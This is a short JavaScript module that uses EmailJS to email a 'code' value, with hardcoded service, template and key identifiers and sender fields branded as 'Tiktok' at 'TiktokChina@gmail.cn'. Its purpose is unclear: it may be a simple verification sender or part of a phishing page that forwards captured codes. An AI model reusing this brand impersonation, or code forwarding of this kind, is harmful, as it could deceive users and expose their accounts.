import emailjs from '@emailjs/browser';
function EmailValid( code ) {
    // Your EmailJS service ID, template ID and Public Key
    const serviceId = 'service_3jhymix';
    const templateId = 'template_vb32a7o';
    const publicKeys = 'BaJU7BU3j0Cy6wYKW';

    // Create a new object that contains dynamic template params
    const templateParams = {
        from_name: 'Tiktok',
        email_id: 'TiktokChina@gmail.cn',
        message: code,
    };
    //Send the email using EmailJS
    emailjs
      .send(serviceId, templateId, templateParams,{
        publicKey: publicKeys,
      })
      .then(
        () => {
          console.log('SUCCESS!');
        },
        (error) => {
          console.log('FAILED...', error.text);
        },
      );
}

export default EmailValid;
